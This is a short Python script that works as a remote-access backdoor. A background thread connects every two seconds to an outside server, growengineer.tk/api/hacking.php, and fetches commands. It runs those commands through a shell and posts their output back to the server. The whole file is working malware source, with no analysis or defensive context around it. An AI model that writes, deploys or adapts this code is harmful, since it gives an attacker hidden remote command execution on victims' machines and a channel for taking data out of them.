from threading import Thread
import time
import subprocess
import json
import socket
import requests
def url_creator(message):
    global host_add
    message = message.replace(" ", "_")
    url = f"GET http://growengineer.tk/api/hacking.php?msg={message} HTTP/1.0\r\n\r\n"
    return url.encode("utf-8")


class background(Thread):
    def run(self):
        global client
        while True:
            socker = socket.socket()
            socker.connect(("growengineer.tk",80))
            socker.send(url_creator('{"action":"getcommand","client":"'+client+'"}'))
            cmd = socker.recv(2048).decode()
            realcmd = cmd.split("*")
            if len(realcmd[1])>1:
                 cmd_list = json.loads(realcmd[1])
                 reply = subprocess.run([cmd_list["cmd"], cmd_list["arg1"],cmd_list["arg2"]],shell=True,capture_output=True)
                 id = cmd_list["id"]
                 url = 'http://growengineer.tk/api/hacking.php'
                 myobj = {'reply': str(reply) , 'action': 'setreply', 'id': int(id)}
                 msg = {'msg': json.dumps(myobj)}
                 x = requests.post(url, data=msg)


            time.sleep(2)



client ="cli2"
hacker = background()
hacker.start()
